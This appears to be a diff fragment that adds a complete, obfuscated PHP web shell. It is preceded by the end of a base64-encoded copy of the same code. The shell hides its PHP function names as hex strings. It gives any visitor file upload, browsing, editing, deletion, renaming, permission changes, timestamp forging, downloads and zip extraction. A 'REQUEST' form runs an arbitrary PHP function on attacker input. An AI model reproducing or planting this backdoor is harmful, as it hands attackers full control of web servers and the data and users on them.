AiKSkgew0KCQkJCQkJCQkJJHppID0gJyc7DQoJCQkJCQkJCX0NCgkJCQkJCQkJZWxzZSB7DQoJCQkJCQkJCQkkemkgPSAnPGEgaHJlZj0iP2Q9Jy5oZXgoJGUpLicmej0nLmhleCgkYykuJyI+VTwvYT4nOw0KCQkJCQkJCQl9DQoJCQkJCQkJCWlmKCRHTkpbMzFdKCIkZC8kYyIpKSB7DQoJCQkJCQkJCQkJJG8gPSAiIjsNCgkJCQkJCQkJfQ0KCQkJCQkJCQllbHNlaWYoISRHTkpbMzJdKCIkZC8kYyIpKSB7DQoJCQkJCQkJCQkJJG8gPSAiIGgiOw0KCQkJCQkJCQl9DQoJCQkJCQkJCWVsc2Ugew0KCQkJCQkJCQkJCSRvID0gIiB3IjsNCgkJCQkJCQkJfQ0KCQkJCQkJCQkkcyA9ICRHTkpbMzRdKCIkZC8kYyIpIC8gMTAyNDsNCgkJCQkJCQkJJHMgPSByb3VuZCgkcywgMyk7DQoJCQkJCQkJCWlmKCRzPj0xMDI0KSB7IA0KCQkJCQkJCQkJJHMgPSByb3VuZCgkcy8xMDI0LCAyKSAuICIgTUIiOw0KCQkJCQkJCQl9IGVsc2Ugew0KCQkJCQkJCQkJJHMgPSAkcyAuICIgS0IiOw0KCQkJCQkJCQl9DQoJCQkJCQkJaWYoKCRjICE9ICIuIikgJiYgKCRjICE9ICIuLiIpKXsNCgkJCQkJCQkJKCRHTkpbOF0oIiRkLyRjIikpID8NCgkJCQkJCQkJJGggLj0gJzx0ciBjbGFzcz0iciI+DQoJCQkJCQkJPHRkPg0KCQkJCQkJCQk8aSBjbGFzcz0iZmFyIGZhLXNub3dmbGFrZSBtIj48L2k+DQoJCQkJCQkJCTxhIGNsYXNzPSJhangiIGhyZWY9Ij9kPScuaGV4KCRlKS5oZXgoIi8iLiRjKS4nIj4nLiRjLic8L2E+DQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQlkaXINCgkJCQkJCQk8L3RkPg0KCQkJCQkJCTx0ZCBjbGFzcz0ieCI+DQoJCQkJCQkJCTxhIGNsYXNzPSJhangnLiRvLiciIGhyZWY9Ij9kPScuaGV4KCRlKS4nJms9Jy5oZXgoJGMpLiciPicueCgiJGQvJGMiKS4nPC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9Jy5oZXgoJGUpLicmdD0nLmhleCgkYykuJyI+Jy4kR05KWzIwXSgiWS1tLWQgSDppIiwgJEdOSlsyMV0oIiRkLyRjIikpLic8L2E+DQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0nLmhleCgkZSkuJyZyPScuaGV4KCRjKS4nIj5SPC9hPg0KCQkJCQkJCQk8YSBocmVmPSI/ZD0nLmhleCgkZSkuJyZ4PScuaGV4KCRjKS4nIj5EPC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQk8L3RyPg0KCQkJCQkJDQoJCQkJCQknDQoJCQkJCQkJOg0KCQkJCQkJCQkkaiAuPSAnPHRyIGNsYXNzPSJyIj4NCgkJCQkJCQk8dGQ+DQoJCQkJCQkJCTxpIGNsYXNzPSJmYXIgZmEtc25vd2ZsYWtlIG0iPjwvaT4mdGhpbnNwOw0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0nLmhleCgkZSkuJyZzPScuaGV4KCRjKS4nIj4nLiRjLic8L2E+DQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQknLiRzLicNCgkJCQkJCQk8L3RkPg0KCQkJCQkJCTx0ZCBjbGFzcz0ieCI+DQoJCQkJCQkJCTxhIGNsYXNzPSJhangnLiRvLiciIGhyZWY9Ij9kPScuaGV4KCRlKS4nJms9Jy5oZXgoJGMpLiciPicueCgiJGQvJGMiKS4nPC9hPg0KCQkJCQkJCTwvdGQ+DQoJCQkJCQkJPHRkIGNsYXNzPSJ4Ij4NCgkJCQkJCQkJPGEgY2xhc3M9ImFqeCIgaHJlZj0iP2Q9Jy5oZXgoJGUpLicmdD0nLmhleCgkYykuJyI+Jy4kR05KWzIwXSgiWS1tLWQgSDppIiwgJEdOSlsyMV0oIiRkLyRjIikpLic8L2E+DQoJCQkJCQkJPC90ZD4NCgkJCQkJCQk8dGQgY2xhc3M9IngiPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0nLmhleCgkZSkuJyZyPScuaGV4KCRjKS4nIj5SPC9hPg0KCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0nLmhleCgkZSkuJyZlPScuaGV4KCRjKS4nIj5FPC9hPg0KCQkJCQkJCQk8YSBocmVmPSI/ZD0nLmhleCgkZSkuJyZnPScuaGV4KCRjKS4nIj5HPC9hPg0KCQkJCQkJCQknLiR6aS4nDQoJCQkJCQkJCTxhIGhyZWY9Ij9kPScuaGV4KCRlKS4nJng9Jy5oZXgoJGMpLiciPkQ8L2E+DQoJCQkJCQkJPC90ZD4NCgkJCQkJCTwvdHI+DQoJCQkJCQkNCgkJCQkJCSc7DQoNCgkJCQkJCQl9DQoJCQkJCQl9DQoJCQkJCX0NCg0KCQkJCQkJZWNobyAkaDsNCgkJCQkJCWVjaG8gJGo7DQoJCQkJCQllY2hvICc8L3Rib2R5Pg0KCQkJCQkJPHRmb290Pg0KCQkJCQkJCTx0cj4NCgkJCQkJCQkJPHRoIGNsYXNzPSJldCI+DQoJCQkJCQkJCQk8YSBjbGFzcz0iYWp4IiBocmVmPSI/ZD0nLmhleCgkZSkuJyZ5Ij5SRVFVRVNUPC9hPg0KCQkJCQkJCQkJPGEgaHJlZj0iP2Q9Jy5oZXgoJGUpLicmcSI+RVhJVDwvYT4NCgkJCQkJCQkJPC90aD4NCgkJCQkJCQkJPHRoIGNsYXNzPSJldCIgd2lkdGg9IjExJSI+PC90aD4NCgkJCQkJCQkJPHRoIGNsYXNzPSJldCIgd2lkdGg9IjE3JSI+PC90aD4NCgkJCQkJCQkJPHRoIGNsYXNzPSJldCIgd2lkdGg9IjE3JSI+PC90aD4NCgkJCQkJCQkJPHRoIGNsYXNzPSJldCIgd2lkdGg9IjExJSI+PC90aD4NCgkJCQkJCQk8L3RyPg0KCQkJCQk8L3Rmb290Pg0KCQkJCTwvdGFibGU+JzsNCgkJCQkJfQ0KCQkJCQk/Pg0KDQoJCQk8L2FydGljbGU+DQoJCQk8Zm9vdGVyIGNsYXNzPSJ4Ij4NCgkJCQkNCgkJCTwvZm9vdGVyPg0KCQkJPD9waHANCgkJCWlmKGlzc2V0KCRfR0VUWyIxIl0pKSB7DQoJCQkJZWNobyAkZjsNCgkJCX0NCgkJCWVsc2VpZihpc3NldCgkX0dFVFsiMCJdKSkgew0KCQkJCWVjaG8gJGc7DQoJCQl9DQoJCQllbHNlIHsNCgkJCQlOVUxMOw0KCQkJfQ0KCQkJPz4NCg0KCQkJPHNjcmlwdD4NCgkJCQkkKCIuYWp4IikuY2xpY2soZnVuY3Rpb24odCl7dC5wcmV2ZW50RGVmYXVsdCgpO3ZhciBlPSQodGhpcykuYXR0cigiaHJlZiIpO2hpc3RvcnkucHVzaFN0YXRlKCIiLCIiLGUpLCQuZ2V0KGUsZnVuY3Rpb24odCl7JCgiYm9keSIpLmh0bWwodCl9KX0pOw0KCQkJPC9zY3JpcHQ+DQoJCTwvYm9keT4NCgk8L2h0bWw+DQo8P3BocA0KCWZ1bmN0aW9uIHJlYygkaikgew0KCQlnbG9iYWwgJEdOSjsNCgkJaWYodHJpbShwYXRoaW5mbygkaiwgUEFUSElORk9fQkFTRU5BTUUgKSwgJy4nKSA9PT0gJycpIHsNCgkJCXJldHVybjsNCgkJfQ0KCQlpZigkR05KWzhdKCRqKSkgew0KCQkJYXJyYXlfbWFwKCdyZWMnLCBnbG9iKCRqIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICd7LC59KicsIEdMT0JfQlJBQ0UgfCBHTE9CX05PU09SVCkpOw0KCQkJJEdOSlszNV0oJGopOw0KCQl9DQoJCWVsc2Ugew0KCQkJJEdOSlsxMF0oJGopOw0KCQl9DQoJfQ0KCWZ1bmN0aW9uIGRyZSgkeTEsICR5Mikgew0KCQlnbG9iYWwgJEdOSjsNCgkJb2Jfc3RhcnQoKTsNCgkJJEdOSlsxNl0oJHkxKCR5MikpOw0KCQlyZXR1cm4gJEdOSlszNl0oKTsNCgl9DQoJZnVuY3Rpb24gaGV4KCRuKSB7DQoJCSR5PScnOw0KCQlmb3IgKCRpPTA7ICRpIDwgc3RybGVuKCRuKTsgJGkrKyl7DQoJCQkkeSAuPSBkZWNoZXgob3JkKCRuWyRpXSkpOw0KCQl9DQoJCXJldHVybiAkeTsNCgl9DQoJZnVuY3Rpb24gdWhleCgkeSkgew0KCQkkbj0nJzsNCgkJZm9yICgkaT0wOyAkaSA8IHN0cmxlbigkeSktMTsgJGkrPTIpew0KCQkJJG4gLj0gY2hyKGhleGRlYygkeVskaV0uJHlbJGkrMV0pKTsNCgkJfQ0KCQlyZXR1cm4gJG47DQoJfQ0KCWZ1bmN0aW9uIE9LKCkgew0KCQlnbG9iYWwgJEdOSiwgJGQ7DQoJCSRHTkpbMzhdKCRHTkpbOV0pOw0KCQloZWFkZXIoIkxvY2F0aW9uOiA/ZD0iLmhleCgkZCkuIiYxIik7DQoJCWV4aXQoKTsNCgl9DQoJZnVuY3Rpb24gRVIoKSB7DQoJCWdsb2JhbCAkR05KLCAkZDsNCgkJJEdOSlszOF0oJEdOSls5XSk7DQoJCWhlYWRlcigiTG9jYXRpb246ID9kPSIuaGV4KCRkKS4iJjAiKTsNCgkJZXhpdCgpOw0KCX0NCglmdW5jdGlvbiB4KCRjKSB7DQoJCWdsb2JhbCAkR05KOw0KCQkkeCA9ICRHTkpbMjRdKCRjKTsNCgkJaWYoKCR4ICYgMHhDMDAwKSA9PSAweEMwMDApIHsNCgkJCSR1ID0gInMiOw0KCQl9DQoJCWVsc2VpZigoJHggJiAweEEwMDApID09IDB4QTAwMCkgew0KCQkJJHUgPSAibCI7DQoJCX0NCgkJZWxzZWlmKCgkeCAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7DQoJCQkkdSA9ICItIjsNCgkJfQ0KCQllbHNlaWYoKCR4ICYgMHg2MDAwKSA9PSAweDYwMDApIHsNCgkJCSR1ID0gImIiOw0KCQl9DQoJCWVsc2VpZigoJHggJiAweDQwMDApID09IDB4NDAwMCkgew0KCQkJJHUgPSAiZCI7DQoJCX0NCgkJZWxzZWlmKCgkeCAmIDB4MjAwMCkgPT0gMHgyMDAwKSB7DQoJCQkkdSA9ICJjIjsNCgkJfQ0KCQllbHNlaWYoKCR4ICYgMHgxMDAwKSA9PSAweDEwMDApIHsNCgkJCSR1ID0gInAiOw0KCQl9DQoJCWVsc2Ugew0KCQkJJHUgPSAidSI7DQoJCX0NCgkJJHUgLj0gKCgkeCAmIDB4MDEwMCkgPyAiciIgOiAiLSIpOw0KCQkkdSAuPSAoKCR4ICYgMHgwMDgwKSA/ICJ3IiA6ICItIik7DQoJCSR1IC49ICgoJHggJiAweDAwNDApID8gKCgkeCAmIDB4MDgwMCkgPyAicyIgOiAieCIpIDogKCgkeCAmIDB4MDgwMCkgPyAiUyIgOiAiLSIpKTsNCgkJJHUgLj0gKCgkeCAmIDB4MDAyMCkgPyAiciIgOiAiLSIpOw0KCQkkdSAuPSAoKCR4ICYgMHgwMDEwKSA/ICJ3IiA6ICItIik7DQoJCSR1IC49ICgoJHggJiAweDAwMDgpID8gKCgkeCAmIDB4MDQwMCkgPyAicyIgOiAieCIpIDogKCgkeCAmIDB4MDQwMCkgPyAiUyIgOiAiLSIpKTsNCgkJJHUgLj0gKCgkeCAmIDB4MDAwNCkgPyAiciIgOiAiLSIpOw0KCQkkdSAuPSAoKCR4ICYgMHgwMDAyKSA/ICJ3IiA6ICItIik7DQoJCSR1IC49ICgoJHggJiAweDAwMDEpID8gKCgkeCAmIDB4MDIwMCkgPyAidCIgOiAieCIpIDogKCgkeCAmIDB4MDIwMCkgPyAiVCIgOiAiLSIpKTsNCgkJcmV0dXJuICR1Ow0KCX0NCglpZihpc3NldCgkX0dFVFsiZyJdKSkgew0KCQkkR05KWzM4XSgkR05KWzldKTsNCgkJaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOw0KCQloZWFkZXIoIkNvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6IEJpbmFyeSIpOw0KCQloZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAiLiRHTkpbMzRdKHVoZXgoJF9HRVRbImciXSkpKTsNCgkJaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1cIiIudWhleCgkX0dFVFsiZyJdKS4iXCIiKTsNCgkJJEdOSlszN10odWhleCgkX0dFVFsiZyJdKSk7DQoJfQ0KPz4=")); ?>a
+<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+$Array = [
+		'7068705f756e616d65',
+		'70687076657273696f6e',
+		'6368646972',
+		'676574637764',
+		'707265675f73706c6974',
+		'636f7079',
+		'66696c655f6765745f636f6e74656e7473',
+		'6261736536345f6465636f6465',
+		'69735f646972',
+		'6f625f656e645f636c65616e28293b',
+		'756e6c696e6b',
+		'6d6b646972',
+		'63686d6f64',
+		'7363616e646972',
+		'7374725f7265706c616365',
+		'68746d6c7370656369616c6368617273',
+		'7661725f64756d70',
+		'666f70656e',
+		'667772697465',
+		'66636c6f7365',
+		'64617465',
+		'66696c656d74696d65',
+		'737562737472',
+		'737072696e7466',
+		'66696c657065726d73',
+		'746f756368',
+		'66696c655f657869737473',
+		'72656e616d65',
+		'69735f6172726179',
+		'69735f6f626a656374',
+		'737472706f73',
+		'69735f7772697461626c65',
+		'69735f7265616461626c65',
+		'737472746f74696d65',
+		'66696c6573697a65',
+		'726d646972',
+		'6f625f6765745f636c65616e',
+		'7265616466696c65',
+		'617373657274',
+];
+$___ = count($Array);
+for($i=0;$i<$___;$i++) {
+	$GNJ[] = uhex($Array[$i]);
+}
+?>
+<!DOCTYPE html>
+	<html dir="auto" lang="en-US">
+
+			<link rel="icon" href="//pngplay.com/wp-content/uploads/13/Snowflake-Transparent-Background.png" />
+			<link rel="stylesheet" href="https://negat1ve1337.github.io/Shell/main.css" type="text/css">
+
+			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+		</head>
+
+		<body>
+			<header>
+				<div class="y x">
+					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
+						Vim Patior					</a>
+				</div>
+
+				<div class="q x w">
+					
+				</div>
+				
+			</header>
+
+			<article>
+				<div class="i">
+					<i class="far fa-snowflake"></i>
+					<?php echo $GNJ[0]();?>
+
+					<br />
+
+					<i class="far fa-snowflake"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+
+					<br />
+
+					<i class="far fa-snowflake"></i>
+					
+					<?php
+					if(isset($_GET["d"])) {
+						$d = uhex($_GET["d"]);
+						$GNJ[2](uhex($_GET["d"]));
+					}
+					else {
+						$d = $GNJ[3]();
+					}
+					$k = $GNJ[4]("/(\\\|\/)/", $d );
+					foreach ($k as $m => $l) { 
+						if($l=='' && $m==0) {
+							echo '<a class="ajx" href="?d=2f">/</a>';
+						}
+						if($l == '') { 
+							continue;
+						}
+						echo '<a class="ajx" href="?d=';
+						for ($i = 0; $i <= $m; $i++) {
+							echo hex($k[$i]); 
+							if($i != $m) {
+								echo '2f';
+							}
+						}
+						echo '">'.$l.'</a>/'; 
+					}
+					?>
+
+					<br />
+
+				</div>
+
+				<div class="u">
+					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-snowflake"></i>
+					<br />
+
+					<br />
+
+					<form method="post" enctype="multipart/form-data">
+						<label class="l w">
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
+						</label>&nbsp;
+					</form>
+
+					<?php
+					$o_ = [ 
+							'<script>$.notify("',
+							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
+						];
+					$f = $o_[0].'OK!'.$o_[1];
+					$g = $o_[0].'ER!'.$o_[1];
+					if(isset($_FILES["n"])) {
+						$z = $_FILES["n"]["name"];
+						$r = count($z);
+						for( $i=0 ; $i < $r ; $i++ ) {
+							if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
+								echo $f;
+							}
+							else {
+								echo $g;
+							}
+						}
+					}
+					?>
+
+				</div>
+					<?php
+					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
+						<thead>
+							<tr>
+								<th>';
+					$b_ = '</th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td></td>
+							</tr>
+							<tr>
+								<td class="x">';
+					$c_ = '</td>
+							</tr>
+						</tbody>
+					</table>';
+					$d_ = '<br />
+										<br />
+										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
+									</form>';
+					if(isset($_GET["s"])) {
+						echo $a_.uhex($_GET["s"]).$b_.'
+									<textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
+									<br />
+									<br />
+									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
+								'.$c_;
+					}
+					elseif(isset($_GET["y"])) {
+						echo $a_.'REQUEST'.$b_.'
+									<form method="post">
+										<input class="x" type="text" name="1" />&nbsp;&nbsp;
+										<input class="x" type="text" name="2" />
+										'.$d_.'
+									<br />
+									<textarea readonly="yes">';
+
+									if(isset($_POST["2"])) {
+										echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
+									}
+
+								echo '</textarea>
+								'.$c_;
+					}
+					elseif(isset($_GET["e"])) {
+						echo $a_.uhex($_GET["e"]).$b_.'
+									<form method="post">
+										<textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
+										<br />
+										<br />
+										<span class="w">BASE64</span> :
+										<select id="b64" name="b64">
+											<option value="0">X</option>
+											<option value="1">Y</option>
+										</select>
+										'.$d_.'
+								'.$c_.'
+								
+					<script>
+						$("#b64").change(function() {
+							if($("#b64 option:selected").val() == 0) {
+								var X = $("textarea").val();
+								var Z = atob(X);
+								$("textarea").val(Z);
+							}
+							else {
+								var N = $("textarea").val();
+								var I = btoa(N);
+								$("textarea").val(I);
+							}
+						});
+					</script>';
+					if(isset($_POST["e"])) {
+						if($_POST["b64"] == "1") {
+							$ex = $GNJ[7]($_POST["e"]);
+						}
+						else {
+							$ex = $_POST["e"];
+						}
+						$fp = $GNJ[17](uhex($_GET["e"]), 'w');
+						if($GNJ[18]($fp, $ex)) {
+							OK();
+						}
+						else {
+							ER();
+						}
+						$GNJ[19]($fp);
+					  }
+					}
+					elseif(isset($_GET["x"])) {
+						rec(uhex($_GET["x"]));
+						if($GNJ[26](uhex($_GET["x"]))) {
+							ER();
+						}
+						else {
+							OK();
+						}
+
+					}
+					elseif(isset($_GET["t"])) {
+						echo $a_.uhex($_GET["t"]).$b_.'
+									<form action="" method="post">
+										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
+										'.$d_.'
+								'.$c_;
+					if( !empty($_POST["t"]) ) {
+						$p = $GNJ[33]($_POST["t"]);
+						if($p) {
+							if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
+								ER();
+							}
+							else {
+								OK();
+							}
+						}
+						else {
+							ER();
+						}
+					  }
+					}
+					elseif(isset($_GET["k"])) {
+						echo $a_.uhex($_GET["k"]).$b_.'
+									<form action="" method="post">
+										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
+										'.$d_.'
+								'.$c_;
+					if(!empty($_POST["b"])) {
+						$x = $_POST["b"];
+						$t = 0;
+					for($i=strlen($x)-1;$i>=0;--$i)
+						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
+					if(!$GNJ[12](uhex($_GET["k"]), $t)) {
+						ER();
+					}
+					else {
+						OK();
+						  }
+						}
+					}
+					elseif(isset($_GET["l"])) {
+						echo $a_.'+DIR'.$b_.'
+									<form action="" method="post">
+										<input name="l" class="x" type="text" value="">
+										'.$d_.'
+								'.$c_;
+					if(isset($_POST["l"])) {
+						if(!$GNJ[11]($_POST["l"])) {
+							ER();
+						}
+						else {
+							OK();
+						}
+					  }
+					}
+					elseif(isset($_GET["q"])) {
+						if($GNJ[10](__FILE__)) {
+							$GNJ[38]($GNJ[9]);
+							header("Location: ".basename($_SERVER['PHP_SELF'])."");
+							exit();
+						}
+						else {
+							echo $g;
+						}
+					}
+					elseif(isset($_GET["n"])) {
+						echo $a_.'+FILE'.$b_.'
+									<form action="" method="post">
+										<input name="n" class="x" type="text" value="">
+										'.$d_.'
+								'.$c_;
+					if(isset($_POST["n"])) {
+						if(!$GNJ[25]($_POST["n"])) {
+							ER();
+						}
+						else {
+							OK();
+						}
+					  }
+					}
+					elseif(isset($_GET["r"])) {
+						echo $a_.uhex($_GET["r"]).$b_.'
+									<form action="" method="post">
+										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
+										'.$d_.'
+								'.$c_;
+					if(isset($_POST["r"])) {
+						if($GNJ[26]($_POST["r"])) {
+							ER();
+						}
+						else {
+							if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
+								OK();
+							}
+							else {
+								ER();
+							}
+						  }
+					   }
+					}
+					elseif(isset($_GET["z"])) {
+						$zip = new ZipArchive;
+						$res = $zip->open(uhex($_GET["z"]));
+							if($res === TRUE) {
+								$zip->extractTo(uhex($_GET["d"]));
+								$zip->close();
+								OK();
+							} else {
+								ER();
+						  }
+					}
+					else {
+					echo '<table cellspacing="0" cellpadding="7" width="100%">
+						<thead>
+							<tr>
+								<th width="44%">[ Behemoth ]</th>
+								<th width="11%">[ Beelzebub ]</th>
+								<th width="17%">[ Asmodeus ]</th>
+								<th width="17%">[ Satanas ]</th>
+								<th width="11%">[ Lucifer ]</th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>
+									<a class="ajx" href="?d='.hex($d).'&n">Add File</a>
+									<a class="ajx" href="?d='.hex($d).'&l">Add Dir</a>
+								</td>
+							</tr>
+						';
+
+							$h = "";
+							$j = "";
+							$w = $GNJ[13]($d);
+							if($GNJ[28]($w) || $GNJ[29]($w)) {
+							foreach($w as $c){
+								$e = $GNJ[14]("\\", "/", $d);
+								if(!$GNJ[30]($c, ".zip")) {
+									$zi = '';
+								}
+								else {
+									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
+								}
+								if($GNJ[31]("$d/$c")) {
+										$o = "";
+								}
+								elseif(!$GNJ[32]("$d/$c")) {
+										$o = " h";
+								}
+								else {
+										$o = " w";
+								}
+								$s = $GNJ[34]("$d/$c") / 1024;
+								$s = round($s, 3);
+								if($s>=1024) { 
+									$s = round($s/1024, 2) . " MB";
+								} else {
+									$s = $s . " KB";
+								}
+							if(($c != ".") && ($c != "..")){
+								($GNJ[8]("$d/$c")) ?
+								$h .= '<tr class="r">
+							<td>
+								<i class="far fa-snowflake m"></i>
+								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
+							</td>
+							<td class="x">
+								dir
+							</td>
+							<td class="x">
+								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
+								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
+							</td>
+						</tr>
+						
+						'
+							:
+								$j .= '<tr class="r">
+							<td>
+								<i class="far fa-snowflake m"></i>&thinsp;
+								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
+							</td>
+							<td class="x">
+								'.$s.'
+							</td>
+							<td class="x">
+								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
+							</td>
+							<td class="x">
+								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
+								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
+								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
+								'.$zi.'
+								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
+							</td>
+						</tr>
+						
+						';
+
+							}
+						}
+					}
+
+						echo $h;
+						echo $j;
+						echo '</tbody>
+						<tfoot>
+							<tr>
+								<th class="et">
+									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
+									<a href="?d='.hex($e).'&q">EXIT</a>
+								</th>
+								<th class="et" width="11%"></th>
+								<th class="et" width="17%"></th>
+								<th class="et" width="17%"></th>
+								<th class="et" width="11%"></th>
+							</tr>
+					</tfoot>
+				</table>';
+					}
+					?>
+
+			</article>
+			<footer class="x">
+				
+			</footer>
+			<?php
+			if(isset($_GET["1"])) {
+				echo $f;
+			}
+			elseif(isset($_GET["0"])) {
+				echo $g;
+			}
+			else {
+				NULL;
+			}
+			?>
+
+			<script>
+				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
+			</script>
+		</body>
+	</html>
+<?php
+	function rec($j) {
+		global $GNJ;
+		if(trim(pathinfo($j, PATHINFO_BASENAME ), '.') === '') {
+			return;
+		}
+		if($GNJ[8]($j)) {
+			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+			$GNJ[35]($j);
+		}
+		else {
+			$GNJ[10]($j);
+		}
+	}
+	function dre($y1, $y2) {
+		global $GNJ;
+		ob_start();
+		$GNJ[16]($y1($y2));
+		return $GNJ[36]();
+	}
+	function hex($n) {
+		$y='';
+		for ($i=0; $i < strlen($n); $i++){
+			$y .= dechex(ord($n[$i]));
+		}
+		return $y;
+	}
+	function uhex($y) {
+		$n='';
+		for ($i=0; $i < strlen($y)-1; $i+=2){
+			$n .= chr(hexdec($y[$i].$y[$i+1]));
+		}
+		return $n;
+	}
+	function OK() {
+		global $GNJ, $d;
+		$GNJ[38]($GNJ[9]);
+		header("Location: ?d=".hex($d)."&1");
+		exit();
+	}
+	function ER() {
+		global $GNJ, $d;
+		$GNJ[38]($GNJ[9]);
+		header("Location: ?d=".hex($d)."&0");
+		exit();
+	}
+	function x($c) {
+		global $GNJ;
+		$x = $GNJ[24]($c);
+		if(($x & 0xC000) == 0xC000) {
+			$u = "s";
+		}
+		elseif(($x & 0xA000) == 0xA000) {
+			$u = "l";
+		}
+		elseif(($x & 0x8000) == 0x8000) {
+			$u = "-";
+		}
+		elseif(($x & 0x6000) == 0x6000) {
+			$u = "b";
+		}
+		elseif(($x & 0x4000) == 0x4000) {
+			$u = "d";
+		}
+		elseif(($x & 0x2000) == 0x2000) {
+			$u = "c";
+		}
+		elseif(($x & 0x1000) == 0x1000) {
+			$u = "p";
+		}
+		else {
+			$u = "u";
+		}
+		$u .= (($x & 0x0100) ? "r" : "-");
+		$u .= (($x & 0x0080) ? "w" : "-");
+		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
+		$u .= (($x & 0x0020) ? "r" : "-");
+		$u .= (($x & 0x0010) ? "w" : "-");
+		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
+		$u .= (($x & 0x0004) ? "r" : "-");
+		$u .= (($x & 0x0002) ? "w" : "-");
+		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
+		return $u;
+	}
+	if(isset($_GET["g"])) {
+		$GNJ[38]($GNJ[9]);
+		header("Content-Type: application/octet-stream");
+		header("Content-Transfer-Encoding: Binary");
+		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
+		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
+		$GNJ[37](uhex($_GET["g"]));
+	}
+?>
